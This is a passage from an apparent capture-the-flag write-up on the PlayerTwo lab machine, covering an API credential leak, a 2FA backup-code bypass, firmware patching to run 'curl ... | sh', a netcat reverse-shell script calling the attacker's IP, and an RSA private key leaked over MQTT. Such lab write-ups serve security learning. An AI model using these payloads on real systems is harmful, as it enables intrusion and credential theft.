</pre></table></code></div></div><p>After fixing my request and sending it to the server I got the following reply:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Host: player2.htb:8545
Date: Wed, 24 Jun 2020 18:30:22 GMT
Connection: close
X-Powered-By: PHP/7.2.24-0ubuntu0.18.04.1
Content-Type: application/json

{"name":"snowscan","pass":"ze+EKe-SGF^5uZQX"}
</pre></table></code></div></div><h2 id="initial-foothold">Initial Foothold</h2><h3 id="logging-into-productplayer2htb">Logging into <code class="language-plaintext highlighter-rouge">product.player2.htb</code></h3><p>Finally! I had some credentials. I tried to use these creds to log into the site at <a href="http://product.player2.htb/">http://product.player2.htb/</a> and got this message:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-nope.png" alt="Nope." /></p><p>Since I had taken a short break after successfully crafting my request and taking notes an all, I figured that maybe the credentials it had supplied me were only good for a limited time since they appeared to be randomly generated. I sent the request through Burp once more to see if it would give a different answer and I got a different set of credentials. I immediately went to the login site and entered them.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/7-new-creds.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/4-nope.png" alt="Nope." /></p><p>After playing around with generating credentials, and looking for other ways to login (SSH did not work, either) I noticed a pattern in the way the method was giving me credential sets. It turns out, there were only four possible usernames and four possible passwords. <em>I also found out that it didn’t seem to matter what data I send to the RPC method, even a blank message worked.</em></p><p>Usernames:</p><ul><li>mprox<li>jkr<li>snowscan<li>0xdf</ul><p>Passwords:</p><ul><li>ze+EKe-SGF^5uZQX<li>tR@dQnwnZEk95*6#<li>XHq7<em>WJTA?QD</em>?E2<li>Lp-+Q8umLW5*7qkc</ul><p>Refusing to give up I tried each combination the server gave me. Nope. a number of times…and then…</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/5-2fa.png" alt="" /></p><p>I was finally successfully authenticated and redirected to <a href="http://product.player2.htb/totp">http://product.player2.htb/totp</a>. 2FA! Now I needed to try and figure out how to bypass this two-factor authentication page by somehow getting a Time-based One-Time Password (TOTP).</p><p><em>Actually, I kind of lied earlier…the first set of credentials it gave me logged me right in and brought me to this page, but it seemed more dramatic this way, especially since I had been so lucky getting the right ones the first time. The creds it gave me didn’t work again shortly after probably because of some internal site error or maybe I fat-fingered pasting it in again. Shortly after, someone reset the box and I then had to go through the rest of that to get back in. The original creds I got seemed to work every time while doing this writeup. Doh!</em></p><h3 id="bypassing-time-based-one-time-password-totp-2fa">Bypassing Time-based One-Time Password (TOTP) 2FA</h3><p>After my <code class="language-plaintext highlighter-rouge">Dirbuster</code> scan of the first website earlier had finished, I had also run it against the <code class="language-plaintext highlighter-rouge">product</code> page as well which led me to discover the <code class="language-plaintext highlighter-rouge">/api</code> folder.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/2-dirbuster.png" alt="" /></p><p>I got lucky after that by guessing that there was a TOTP API since the page mentioned backup codes. This led me to the page <a href="http://product.player2.htb/api/totp">http://product.player2.htb/api/totp</a>. Navigating to the <code class="language-plaintext highlighter-rouge">/api/totp</code> page gave me a useful error:</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{"error":"Cannot GET \/"}
</pre></table></code></div></div><p>This looked to be another JSON formatted reply, so I decided to research how to bypass JSON based 2FA. This led me to <a href="https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html">https://c0d3g33k.blogspot.com/2018/02/how-i-bypassed-2-factor-authentication.html</a>. The author described the message he sent to the server as below, though I didn’t have all that information.</p><blockquote><p><code class="language-plaintext highlighter-rouge">{"action":"backup_codes","clusterNum":"000","accountId":"test123","email":"test123@gmail.com"}</code></p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/6-invalid-session.png" alt="&quot;invalid_session&quot;" /></p><p>I tried sending a blank test message using Burp like before, but this gave me an “invalid session” error message, so I determined I probably needed to send the PHPSESSID I saw in my cookies after I logged into the site. Sending the session ID in a header kept giving me the same error until I realized my mistake. <strong>Need to send the session ID in a</strong> <em><strong>COOKIE!!!</strong></em> <em>**</em> After that, the error message became “invalid action”.</p><p>On the 2FA site I saw:</p><blockquote><p>2FA You can either use the OTP that we sent to your mobile or the <code class="language-plaintext highlighter-rouge">backup codes</code> that you have with you.</p></blockquote><p>Emphasis above is mine. Since I had already noticed on the <code class="language-plaintext highlighter-rouge">/totp</code> site that I was looking for “backup codes”, and the blog above had <code class="language-plaintext highlighter-rouge">{"action":"backup_codes",</code> in his request, this looked like what I needed.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>POST /api/totp HTTP/1.1
Host: product.player2.htb
Content-Type:application/json
Content-Length: 31
Cookie: PHPSESSID=7987tggfl6k22pq872k2vhqcej

{
  "action":"backup_codes"
}
</pre></table></code></div></div><p>Once I got my request formatted correctly ,and had the proper Cookie header, I got a response from the server.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Date: Wed, 24 Jun 2020 23:56:46 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 43
Content-Type: application/json

{"user":"snowscan","code":"84573484857384"}
</pre></table></code></div></div><p>I had my 2FA code! I used this code on the <code class="language-plaintext highlighter-rouge">/totp</code> page and was greeted with the page at <a href="http://product.player2.htb/protobs/">http://product.player2.htb/protobs/</a>.</p><h3 id="the-internal-protobs-page">The internal protobs page</h3><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/8-protobs-after2fa.png" alt="" /></p><p>Since it was the name of the product, my first instinct was to test and see if there was a page at http://product.player2.htb/protobs.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/11-protobs-uploader.png" alt="" /></p><p>Yep. Lucky guess again. It seemed that I can upload files to go through some sort of verification, which redirected to the page <a href="http://product.player2.htb/protobs/verify">http://product.player2.htb/protobs/verify</a>. I tried uploading a PHP reverse shell, but it just led to a blank white page and did not send me a shell. After experimenting with various file uploads and testing for command injection and other things I moved on to explore the rest of the <code class="language-plaintext highlighter-rouge">/home</code> page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/12-protobs-pdf_link.jpg" alt="" /></p><p>After searching around the site for awhile, I found a very hard to see link under the heading “Get an early access to Protobs”. The background was animated and the explosion kept obscuring the text. In the screenshot above I have my mouse hovering over the link (see the URL in the bottom left corner). Clicking on this link gave me a pdf at <a href="http://product.player2.htb/protobs.pdf">http://product.player2.htb/protobs.pdf</a>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/17-protobs-pdf.png" alt="" /></p><p>This document describes the firmware verification process, which is likely what is happening at the <code class="language-plaintext highlighter-rouge">/verify</code> page I found earlier.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/18-protobs-pdf2.png" alt="" /></p><p>The last page in the PDF confirms this. It looks like Protobs developers can use the <code class="language-plaintext highlighter-rouge">/protobs/verify</code> page to test out their firmware before pushing it to customers. I downloaded the firmware file, and unzipped it. Inside was an <code class="language-plaintext highlighter-rouge">info</code> file with copyright information, a <code class="language-plaintext highlighter-rouge">version</code> file with versioning information, and the <code class="language-plaintext highlighter-rouge">protobs.bin</code> firmware file.</p><h3 id="protobsbin">Protobs.bin</h3><p>Running the <code class="language-plaintext highlighter-rouge">file</code> command against the <code class="language-plaintext highlighter-rouge">Protobs.bin</code> file shows that it is just data.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/playertwo$ file Protobs.bin 
Protobs.bin: data
</pre></table></code></div></div><p>However, opening the file in GHex, I can see an ELF header, meaning this is a Linux executable with some data stuffed at the beginning (most likely the verification signature).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/19-protobs-ghex.png" alt="" /></p><p>While browsing through the file, I saw a string in the ELF that looks suspiciously like a shell command: <code class="language-plaintext highlighter-rouge">stty raw -echo min 0 time 10</code>. Since this command was placed in the program as a plain string, perhaps I could replace it with my own command and could possibly get code execution on the remote server.</p><h3 id="researching-how-to-replace-a-section-of-code-inside-an-elf-executable">Researching how to replace a section of code inside an ELF executable</h3><p>I did some research into how to replace a section of code in the ELF, and came up with <a href="https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file">https://reverseengineering.stackexchange.com/questions/14607/replace-section-inside-elf-file</a>. This in turn led to: <a href="https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd">https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd</a>. Using strings to determine the byte offset of the code to replace, then using <code class="language-plaintext highlighter-rouge">dd</code> it is possible to replace arbitrary code. However, it seemed to me as if all they were doing was some fancy cut and paste.</p><p>I knew from previous experience from doing CTFs that you could modify the hex code of a file (and by extension the ASCII strings they represent) almost as easily as using a regular text editor. I decided to try “cheating” a bit using GHex. I selected the string I wanted to replace, and wrote my own commands in its place. I kept it as simple as possible since I didn’t know what kind of checks the verification would do, and decided to create a staged payload. I wanted this program to download a script that would be hosted on my local python SimpleHTTPServer. My code read:<code class="language-plaintext highlighter-rouge">curl 10.10.15.20:8090/a | sh</code> . This would download my script called simply <code class="language-plaintext highlighter-rouge">a</code> and then execute it using <code class="language-plaintext highlighter-rouge">sh</code>. <em>I would have used bash, but nearly every Linux box is guaranteed to have <code class="language-plaintext highlighter-rouge">sh</code> or at least something aliased to it, and this also saved me a couple characters!</em></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>#!/bin/sh
#get netcat in case remote system can't '-e'
curl 10.10.15.20:8090/nc -o /dev/shm/nc 
#make netcat executable
chmod +x /dev/shm/nc 
#use netcat reverse shell
/dev/shm/nc 10.10.15.20 12345 -e /bin/sh 
</pre></table></code></div></div><p>Once my script executed, it would then reach back and download netcat (in case the version on the machine did not have <code class="language-plaintext highlighter-rouge">-e</code> capability). After that it made <code class="language-plaintext highlighter-rouge">nc</code> executable and created a reverse shell back to my computer which was waiting to catch it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/16-got-shell%20%281%29.png" alt="" /></p><h2 id="road-to-user">Road to User</h2><h3 id="upgrading-to-a-usable-shell">Upgrading to a usable shell</h3><p>After getting a rough shell on the machine, my first order of business was moving to a more comfortable shell with all of the creature comforts such as history, tab auto-completion, and the ability to use non-character keys (such as the arrow keys).</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")';
www-data@player2:/var/www/product/protobs$ ^Z             
[1]+  Stopped                 nc -lvnp 12345
zweilos@kalimaa:~/htb/playertwo$ stty raw -echo;
zweilos@kalimaa:~/htb/playertwo$ fg
</pre></table></code></div></div><p>First I made sure that python was installed, then upgraded from a limited shell to a more useful one in just a few steps:</p><ol><li>Use a python one-liner to spawn a <code class="language-plaintext highlighter-rouge">bash</code> shell with <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash")';</code><li>Background the shell and return to my machine with <code class="language-plaintext highlighter-rouge">ctrl-z</code><li>Type <code class="language-plaintext highlighter-rouge">stty raw -echo;</code> to allow sending of raw keyboard input through the pty. This lets me use <code class="language-plaintext highlighter-rouge">ctrl-c</code> to kill commands on the other side rather than kill my shell (for example).<li>Type <code class="language-plaintext highlighter-rouge">fg</code> to bring my shell back to the foreground</ol><h3 id="enumerating-as-www-data">Enumerating as <code class="language-plaintext highlighter-rouge">www-data</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>
www-data@player2:/var/www/product/protobs$ ls -la
total 48
drwxr-xr-x 5 root     root     4096 Dec 16  2019 .
drwxr-xr-x 6 www-data www-data 4096 Dec  1  2019 ..
-rwxr-xr-x 1 www-data www-data 1176 Sep  3  2019 gen_firm_keys.py
-rw-r--r-- 1 www-data www-data 3410 Nov 10  2019 index.php
dr-x------ 2 www-data www-data 4096 Sep  3  2019 keys
drwxr-xr-x 4 www-data www-data 4096 Sep  5  2019 pihsm
-rw-r--r-- 1 root     root     4711 Dec  1  2019 protobs_firmware_v1.0.tar
-rwxr-xr-x 1 www-data www-data  804 Sep  4  2019 sign_firm.py
drwxrwxrwx 2 www-data www-data 4096 Jun 25 02:54 uploads
-rw-r--r-- 1 www-data www-data 1775 Dec 10  2019 verify.php
-rwxr-xr-x 1 www-data www-data  837 Dec  1  2019 verify_signature.py
</pre></table></code></div></div><p>Next I checked for any password-less sudo permissions with <code class="language-plaintext highlighter-rouge">sudo -l</code> but there weren’t any. A quick check of the directory I was in showed the back-side code for the website.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>www-data@player2:/home$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
observer:x:1000:1000:observer:/home/observer:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
mosquitto:x:112:115::/var/lib/mosquitto:/usr/sbin/nologin
egre55:x:1001:1001::/home/egre55:/bin/sh
</pre></table></code></div></div><p>A look inside <code class="language-plaintext highlighter-rouge">/etc/passwd</code> shows three users that can log in: <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">egre55</code>, and <code class="language-plaintext highlighter-rouge">observer</code> .</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>www-data@player2:/home$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jul 27  2019 .
drwxr-xr-x 23 root     root     4096 Sep  5  2019 ..
drwxr-xr-x  6 observer observer 4096 Nov 16  2019 observer
</pre></table></code></div></div><p>However, the user <code class="language-plaintext highlighter-rouge">egre55</code> user home folder wasn’t visible to me, even though it is specified in <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. Looks like <code class="language-plaintext highlighter-rouge">observer</code> is the most likely avenue for privilege escalation.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>mosquit+   1164  0.0  0.2  48024  5792 ?        S    Jun24   0:05 /usr/sbin/mosquitto -c /etc/mosquitto/mosquitto.conf
root       1177  0.0  1.0 185924 20136 ?        Ssl  Jun24   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       1178  0.0  0.8 337936 17196 ?        Ss   Jun24   0:00 /usr/sbin/apache2 -k start
mysql      1225  0.0  9.7 1490216 189964 ?      Sl   Jun24   0:09 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
root       1527  0.0  0.1  57496  3288 ?        S    Jun24   0:00 /usr/sbin/CRON -f
root       1535  0.0  0.0   4624   864 ?        Ss   Jun24   0:00 /bin/dash -p -c sudo -u egre55 -s /bin/sh -c "/usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php"
root       1541  0.0  0.2  66548  4352 ?        S    Jun24   0:00 sudo -u egre55 -s /bin/sh -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1543  0.0  0.0   4624   872 ?        S    Jun24   0:00 /bin/dash -p -c \/bin\/sh -c \/usr\/bin\/php\ -S\ 0\.0\.0\.0\:8545\ \/var\/www\/main\/server\.php
egre55     1544  0.0  0.0   4624   832 ?        S    Jun24   0:00 /bin/dash -p -c /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
egre55     1545  0.0  1.1 275764 21384 ?        S    Jun24   0:00 /usr/bin/php -S 0.0.0.0:8545 /var/www/main/server.php
</pre></table></code></div></div><p>Some of the interesting processes that were running are shown above. Netstat showed two additional ports listening on 127.0.0.1, <code class="language-plaintext highlighter-rouge">port 1883 -&gt; MQQT</code> and <code class="language-plaintext highlighter-rouge">port 3306 -&gt; MySQL.</code>After poking around for a bit and not finding anything useful, I decided to start with mosquitto since I hadn’t heard of it.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre># Place your local configuration in /etc/mosquitto/conf.d/
# 
# A full description of the configuration file is at
# /usr/share/doc/mosquitto/examples/mosquitto.conf.example

pid_file /var/run/mosquitto.pid

persistence true
persistence_location /var/lib/mosquitto/

log_dest file /var/log/mosquitto/mosquitto.log
bind_address 127.0.0.1
include_dir /etc/mosquitto/conf.d
</pre></table></code></div></div><p>First I started with <code class="language-plaintext highlighter-rouge">/etc/mosquitto/mosquitto.conf</code> since I had seen it in the <code class="language-plaintext highlighter-rouge">ps aux</code> output, but there wasn’t anything very interesting there.</p><h3 id="mosquitto-mqtt-research">Mosquitto (MQTT) Research</h3><ul><li><a href="https://mosquitto.org/">https://mosquitto.org/</a> <a href="https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto">https://book.hacktricks.xyz/pentesting/1883-pentesting-mqtt-mosquitto</a><li><a href="https://github.com/Warflop/IOT-MQTT-Exploit">https://github.com/Warflop/IOT-MQTT-Exploit</a><li><a href="https://mosquitto.org/man/mosquitto_pub-1.html">https://mosquitto.org/man/mosquitto_pub-1.html</a><li><a href="https://mosquitto.org/man/mosquitto_sub-1.html">https://mosquitto.org/man/mosquitto_sub-1.html</a><li><a href="https://mosquitto.org/man/mqtt-7.html">https://mosquitto.org/man/mqtt-7.html</a></ul><p>Next I did quite a bit of reading into the <code class="language-plaintext highlighter-rouge">Mosquitto</code> service, and found that it is a service for passing messages between applications and services. Each can ‘subscribe’ to different topics, and will receive messages pushed to that topic, sort of like push notifications for apps on a cell phone. It is intended to be lightweight and good for low power situations such as for IOT devices. Perhaps if I could find the right topics to subscribe to, there would be some useful information that would help me to escalate my privileges.</p><p>I found that to subscribe to topics I needed to use the <code class="language-plaintext highlighter-rouge">mosquitto_sub</code> program. The man page at <a href="https://mosquitto.org/man/mosquitto_sub-1.html">https://mosquitto.org/man/mosquitto_sub-1.html</a> gave me all the info I needed.</p><blockquote><p><strong>mosquitto_sub</strong> is a simple MQTT version 5/3.1.1 client that will subscribe to topics and print the messages that it receives.</p><p>Subscribe to all broker status messages:</p><ul><li>mosquitto_sub <code class="language-plaintext highlighter-rouge">-v</code> <code class="language-plaintext highlighter-rouge">-t</code> $SYS/#</ul></blockquote><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>4.7.2  Topics beginning with $

The Server MUST NOT match Topic Filters starting with a wildcard character (# or +) with Topic Names beginning with a $ character [MQTT-4.7.2-1]. The Server SHOULD prevent Clients from using such Topic Names to exchange messages with other Clients. Server implementations MAY use Topic Names that start with a leading $ character for other purposes.

Non-normative comment

·         $SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs

·         Applications cannot use a topic with a leading $ character for their own purposes

Non-normative comment

·         A subscription to “#” will not receive any messages published to a topic beginning with a $

·         A subscription to “+/monitor/Clients” will not receive any messages published to “$SYS/monitor/Clients”

·         A subscription to “$SYS/#” will receive messages published to topics beginning with “$SYS/”

·         A subscription to “$SYS/monitor/+” will receive messages published to “$SYS/monitor/Clients”

·         For a Client to receive messages from topics that begin with $SYS/ and from topics that don’t begin with a $, it has to subscribe to both “#” and “$SYS/#”
</pre></table></code></div></div><p><a href="https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901014">https://docs.oasis-open.org/mqtt/mqtt/v5.0/os/mqtt-v5.0-os.html#_Toc3901014</a> describes that topic subscription as:</p><blockquote><p>$SYS/ has been widely adopted as a prefix to topics that contain Server-specific information or control APIs</p></blockquote><p>“Server-specific information or control APIs” sounded promising.</p><h3 id="finding-user-creds">Finding user creds</h3><p>In order to subscribe to <code class="language-plaintext highlighter-rouge">$SYS/#</code> I used some information from the <code class="language-plaintext highlighter-rouge">mosquitto.conf</code> file and the port I had found open from netstat. <code class="language-plaintext highlighter-rouge">mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v</code></p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre>observer@player2:~$ mosquitto_sub -h localhost -p 1883 -t '$SYS/#' -v
$SYS/broker/version mosquitto version 1.4.15
$SYS/broker/timestamp Tue, 18 Jun 2019 11:42:22 -0300
...snipped...
$SYS/internal/firmware/signing Retrieving the key from aws instance
$SYS/internal/firmware/signing Key retrieved..
$SYS/broker/uptime 319 seconds
...snipped...
$SYS/internal/firmware/signing -----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA7Gc/OjpFFvefFrbuO64wF8sNMy+/7miymSZsEI+y4pQyEUBA
R0JyfLk8f0SoriYk0clR/JmY+4mK0s7+FtPcmsvYgReiqmgESc/brt3hDGBuVUr4
et8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT
+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz
SM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7/wGzjvJzVBywCxirkhPnv8sQmdE
+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C/3xBWd
62NnWfZJ5i9mzd/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN
wANiwcgNg9U1vS+MFB7xeqbtUszvoizA2/ScZW3P/DURimbWq3BkTdgVOjhElh6D
62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH/oDbZzAHTo6IO
91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC
gw4R0V+96fOtYrqDaLiBeJTMRYp/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya/Y
QACn17UCgYEA/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f
llga+8yZZyeWB/rWmOLSmT/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos
JqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3
JloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt
ioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP
QFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T
pp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4
hvFPPCKJPqkj10TBw/a/vXUAjtlI+7ja/K8GmQblW+P/8UeSUVBLeBYoSeiJIkRf
PYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI
NoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt
uaYs8AeupNl31LD7oMVLPDrxSLi/N5o1I4rOTfKKfGa31vD1DoCoIQ/brsGQyI6M
zxQNDwKBgQCBOLY8aLyv/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK
/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a/y8g/leCrvPDM19KB5Zr0Z1tCw5XCz
iZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ/2y5+2+lC7wIlFMyYze8n8g==
-----END RSA PRIVATE KEY-----

$SYS/internal/firmware/signing Verifying signing..
$SYS/internal/firmware/signing Sent logs to apache server.
</pre></table></code></div></div><p>I now was the proud owner of a shiny new SSH key! I took it and tried to log in as the <code class="language-plaintext highlighter-rouge">egre55</code> and <code class="language-plaintext highlighter-rouge">observer</code> users I saw earlier.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>zweilos@kalimaa:~/htb/playertwo$ ssh -i observer_id_rsa observer@10.10.10.170

load pubkey "observer_id_rsa": invalid format
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.2.5-050205-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 25 21:41:14 UTC 2020

  System load:  0.0                Processes:            167
  Usage of /:   26.1% of 19.56GB   Users logged in:      0
  Memory usage: 25%                IP address for ens33: 10.10.10.170
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

121 packages can be updated.
5 updates are security updates.


Last login: Sun Dec  1 15:33:19 2019 from 172.16.118.129
